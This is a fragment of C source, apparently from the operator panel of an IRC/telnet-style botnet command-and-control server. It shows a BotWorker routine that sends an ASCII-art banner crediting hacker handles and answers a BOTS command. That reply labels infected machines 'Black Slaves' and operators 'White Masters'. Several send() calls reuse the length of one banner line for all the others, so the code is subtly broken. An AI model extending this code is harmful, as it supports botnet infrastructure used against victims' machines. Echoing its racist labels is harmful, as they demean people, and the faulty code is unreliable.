...
void *BotWorker(void *sock) {
    ...
    while(j!=i-1) {
		...
		sprintf(ascii_banner_line3, "\x1b[36m              | |     Skid Offline      | |              \r\n");
		sprintf(ascii_banner_line4, "\x1b[36m              | |     #n00dl3z          | |              \r\n");
		sprintf(ascii_banner_line5, "\x1b[36m              | |     #Ghost            | |              \r\n");
		sprintf(ascii_banner_line6, "\x1b[36m              | |     #KillerPanda      | |              \r\n");
		sprintf(ascii_banner_line7, "\x1b[36m              | |     #iTz-GoDModZ      | |              \r\n");
		sprintf(ascii_banner_line8, "\x1b[36m              |  \_____________________/  |              \r\n");
		sprintf(ascii_banner_line9, "\x1b[36m              |___________________________|              \r\n");
		sprintf(ascii_banner_line10, "\x1b[36m            ,---\_____     []     _______/------,       \r\n");
		sprintf(ascii_banner_line11, "\x1b[36m          /         /______________\           /|       \r\n");
		sprintf(ascii_banner_line12, "\x1b[36m        /___________________________________ /  | ___   \r\n");
		sprintf(ascii_banner_line13, "\x1b[36m        |                                   |   |    )  \r\n");
		sprintf(ascii_banner_line14, "\x1b[36m        |  _ _ _                 [-------]  |   |   (   \r\n");
		sprintf(ascii_banner_line15, "\x1b[36m        |  o o o                 [-------]  |  /    _)_ \r\n");
		sprintf(ascii_banner_line16, "\x1b[36m        |__________________________________ |/     /  / \r\n");
		sprintf(ascii_banner_line17, "\x1b[36m    /-------------------------------------/|      ( )/  \r\n");
		sprintf(ascii_banner_line18, "\x1b[36m  /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /             \r\n");
		sprintf(ascii_banner_line19, "\x1b[36m/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /               \r\n");
		sprintf(ascii_banner_line20, "\x1b[36m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                 \r\n");
		...
		if(send(datafd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line10, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line11, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line12, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line13, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line14, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line15, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line16, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line17, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line18, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line19, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line20, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line21, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		...
		while(fdgets(buf, sizeof buf, datafd) > 0)
		{
			if(strstr(buf, "BOTS")) {
				...
				sprintf(botcount, "[+] - Black Slaves: [\x1b[36m %d \x1b[37m] [+] - White Masters: [\x1b[36m %d \x1b[37m]\r\n", BotsConnected(), OperatorsConnected);
